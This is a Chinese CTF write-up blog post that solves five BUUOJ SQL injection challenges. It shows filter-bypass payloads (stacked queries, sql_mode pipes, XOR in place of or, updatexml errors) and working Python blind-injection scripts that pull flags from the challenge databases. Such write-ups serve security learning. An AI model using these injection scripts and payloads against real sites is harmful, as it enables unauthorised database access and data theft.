---
title: BUUOJ刷题记录
date: 2020-04-04
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120170627.png
description: 
categories: 
- ctf_writeup
tags:
- SQLi
---
### [\[SUCTF 2019\]EasySQL](https://buuoj.cn/challenges#[SUCTF%202019]EasySQL)

考点：堆叠注入、MySQL中sql_mode参数

题目存在过滤，尝试之后发现可以通过`0 || 1`这样的语句进行bool盲注，但是此题似乎限制了输入信息的长度，所以这个盲注只能注出来库名`CTF`后面的东西就没办法搞，后来看了wp之后才知道存在堆叠注入，尝试之：

```
1;
```

并没有报错，而且返回了查询成功额页面，所以存在堆叠注入

```
1;show databases;
```

返回

```
Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
```

表名：

```
1;show tables;
```

返回：

```
Array ( [0] => 1 ) Array ( [0] => Flag )
```

但是flag关键字被过滤了，

这就没办法直接查到flag的信息。

由官方wp的解释来看，这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于，其描述的功能和实际的功能似乎并不相符，通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用。

给出的查询语句是：`select $_POST[query] || flag from flag`

预期解是：

```
1;set sql_mode=pipes_as_concat;select 1
```

然后有一个非预期是：

```
*,1
```

flag{05c299f9-2a8b-440e-98d1-d528859be168}

这里说明一下：

#### [sql_mode](https://blog.csdn.net/weixin_42373127/article/details/88866710)

是一组mysql支持的基本语法及校验规则
查询当前系统sql_mode的设置:

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120165655.png)

其中：

PIPES_AS_CONCAT：
将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似

 

 

 

 

### [[极客大挑战 2019\]FinalSQL](https://buuoj.cn/challenges#[极客大挑战%202019]FinalSQL)

考点：bool盲注，`1^(condition)^1`绕过or被滤，嵌套()绕过空格被过滤

相比于这个比赛的其他sqli，这道题多了`id=`的查询页面，并且提示了是MySQL盲注

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120165702.jpeg)

起初发现了username位置可以用反斜杠逃逸，不过因为所有的注释方法都被过滤了，就没有什么用

fuzz，常规的单引号，空格，注释，or，|，&都被过滤了。

随便点一个数字，发现是不用注释的数值型注入（嘿嘿嘿）

`or`被过滤，使用`1^(condition)`来绕过：

```
?id=0
//返回ERROR
?id=0^1
//返回NO! Not this! Click others~~~
```

那么我们注入成功了，不过要把`(condition)`换成其他查询语句还需要在末尾再添一个`^1`（我也不知道怎么回事儿）

```
?id=1^((length(database()))>1)^1
//返回NO! Not this! Click others~~~
?id=1^((length(database()))>99)^1
//返回ERROR！！！
```

那么我们可以轻松地区别出bool真假页面返回信息不同

话不多说，直接上exp：

```
#by wh1sper
#bool盲注
import requests

host = 'http://368375df-ca56-4f5d-8cd4-ab07fb575003.node3.buuoj.cn/search.php?id='

def mid(bot, top):
    return (int)(0.5*(top + bot))

def sqli():
    name = ''
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:
            #select = '(ascii(substr(database(),{},1)))>{}'.format(j, mid(top, bot))#--->geek
            #查库名

            #select = "(ascii(substr((select(group_concat(table_name))
            # from(information_schema.tables)where(table_schema='geek')),{},1)))>{}"
            # .format(j, mid(top, bot))#--->F1naI1y,Flaaaaag
            #查表名

            #select = "(ascii(substr((select(group_concat(column_name))
            # from(information_schema.columns)where(table_name='Flaaaaag')),{},1)))>{}"
            # .format(j, mid(top, bot))#--->id,fl4gawsl
            #查列名
            
            select = "(ascii(substr((select(group_concat(password))" \
                     "from(F1naI1y)),{},1))>{})".format(j, mid(top, bot))

            playload = "1^("+select+")^1"
            #print(playload)
            r = requests.get(url=host+playload)
            #print(r.text)
            if 'NO!' in r.text:  # 成功
                if top - 1 == bot:      # top和bot相邻，说明name是top
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)  # 成功就上移bot
            else:               # 失败
                if top - 1 == bot:      # top和bot相邻，加上失败，说明name是bot
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)  # 失败就下移top


if __name__ == '__main__':
    sqli()
```

flag{c0db499e-7c62-46c7-a2ce-0bd9a239cc25}

 

 

 

### [[CISCN2019 华北赛区 Day2 Web1\]Hack World](https://buuoj.cn/challenges#[CISCN2019%20华北赛区%20Day2%20Web1]Hack%20World)

考点：SQLi、括号嵌套绕过空格、^符号绕过or

直接给了表名='flag'，列名='flag'。

 

fuzz，常规搞事儿关键字都被过滤；

想到了前几天做的finalSQLi，尝试用`^`代替`or`

```
0^1
//返回Hello, glzjin wants a girlfriend.和1的结果一样，说明起效了
```

那么尝试库名：

```
0^(length(database())>1)
//成功
```

ok，直接写脚本

需要注意的是substr(`(condition)`,1,1)的`condition子查询`，两边需要括号，不然来不了事儿。

exp：

```
#wh1sper
#bool盲注
import requests

host = 'http://14bb7de3-9b94-4870-9178-2fefa1bfc029.node3.buuoj.cn/index.php'

def mid(bot, top):
    return (int)(0.5*(top + bot))

def sqli():
    name = ''
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:

            #babyselect = "database()"-->ctftraining
            #babyselect = "version()"-->10.2.26-MariaDB-log

            babyselect = "(select(flag)from(ctftraining.flag))"
            select = "ascii(substr("+babyselect+",{},1))>{}".format(j, mid(top, bot))
            playload = "0^("+select+")"

            data = {
                "id": playload
            }

            #print(playload)
            r = requests.post(url=host, data=data)
            #print(r.text)
            if 'glzjin wants' in r.text:  # 成功
                if top - 1 == bot:      # top和bot相邻，说明name是top
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)  # 成功就上移bot
            else:               # 失败
                if top - 1 == bot:      # top和bot相邻，加上失败，说明name是bot
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)  # 失败就下移top


if __name__ == '__main__':
    sqli()
```

flag{2ed1b2c4-f083-424e-a4e9-303222f99563}

 

 

 

 

### [[GYCTF2020\]Ezsqli](https://buuoj.cn/challenges#[GYCTF2020]Ezsqli)

考点：bool盲注，绕`information_schema`和`sys.schema_auto_increment_columns`，无列名过滤union和join

本站[GYCTFwp](http://wh1sper.com/2020i春秋新春战疫公益赛_web_wp/)已经讲过，所以简单说。

```
0||1
//返回Nu1L
0||0
//返回Error Occured When Fetch Result.
```

判断为bool盲注；

`information_schema`和`sys.schema_auto_increment_columns`这两个都被过滤了，可以使用`sys.schema_table_statistics_with_buffer`，无列名，而且过滤union和join，就只能用类似于：

```
(select 'admin','admin')>(select * from users limit 1)
```

这样的语句，前提是两边的查询列数相等，然后是按位比较，在某一位上谁大，那么就是谁大，如果相等的话，就比较下一位。

举几个例子：

```
g > flag{abcd}
a < flag{abcd}
fz > flag{bbbbb}//第一位相等，比较第二位
```

那么直接exp：

```
#wh1sper
#bool盲注
import requests

host = 'http://7282ff4f-c5c7-4023-be2e-b40f0e422e2c.node3.buuoj.cn/index.php'

def mid(bot, top):
    return (int)(0.5*(top + bot))

def trans_to_hex(str):
    result = '0x'
    for i in str:
        temp = hex(ord(i))
        result += temp.replace('0x','')
    return result


def sqli():
    name = ''
    for j in range(20, 250):
        top = 126
        bot = 32
        while 1:
            #babyselect = "(database())"--->give_grandpa_pa_pa_pa
            #babyselect = "(version())"--->10.2.26-MariaDB-log

            #babyselect = "(select group_concat(table_name) from 
            # sys.schema_table_statistics_with_buffer
            # where table_schema=database())"--->users233333333333333,f1ag_1s_h3r3_hhhhh

            #select = "ascii(substr("+babyselect+",{},1))>{}".format(j, mid(top, bot))

            select = "(select * from f1ag_1s_h3r3_hhhhh)>(select 1,{})".\
                format(trans_to_hex(name+chr(mid(bot, top))))
            playload = "0||"+select
            data = {
                "id": playload
            }
            #print(playload)
            r = requests.post(url=host, data=data)
            #print(r.text)
            if '|' in name://最后一位没有下一位可以比较，只能在这里返回，替换一下即可
                name = name.lower().replace('|', '}')
                print(name)
                return

            if 'Nu1L' in r.text:  # 成功
                if top - 1 == bot:      # top和bot相邻，说明name是top
                    name += chr(top-1)
                    print(name)
                    break
                bot = mid(bot, top)  # 成功就上移bot
            else:               # 失败
                if top - 1 == bot:      # top和bot相邻，加上失败，说明name是bot
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)  # 失败就下移top


if __name__ == '__main__':
    sqli()
```

原题flag都是小写，所以就没管它，不过[出题人笔记](https://www.smi1e.top/新春战疫公益赛-ezsqli-出题小记/)里边本来想考大小写的，我太垃圾，就没管了

flag{ec726349-d504-4a00-a288-7b72fbc33418}

 

 

 

### [[极客大挑战 2019\]HardSQL](https://buuoj.cn/challenges#[极客大挑战%202019]HardSQL)

考点：报错注入

先是fuzz，引号，注释没被过滤，|、&、空格、*这些都被过滤了

利用亦或符号进行注入：

```
username=1'^1%23&password=1
回显：
Login Success!!
```

应该可以盲注或者报错注入

我这里用的是报错注入

```
import requests
import re
 
host = 'http://7e5bdd7f-60ce-49fc-88cb-cf4e6ac51763.node3.buuoj.cn/check.php?'
#babystr = "select(database())"-->geek
#babystr = "select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))"-->H4rDsq1
#babystr = "select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))"-->id,username,password
#babystr = "select(left(group_concat(password),31))from(H4rDsq1)"
babystr = "select(right(group_concat(password),31))from(H4rDsq1)"
#--flag{9b788a2b-b307-4935-b7e7-0b'
#--2b-b307-4935-b7e7-0b853f26382a}
#flag{9b788a2b-b307-4935-b7e7-0b853f26382a}
payload = "username=1'^updatexml(1,concat(0x7e,({}),0x7e),1)%23&password=1".format(babystr)
r = requests.get(host+payload)
print(payload)
print(r.text)
```

注意点是updatexml这个报错注入只能显示32个字符，需要两次用left和right分别打

flag{9b788a2b-b307-4935-b7e7-0b853f26382a}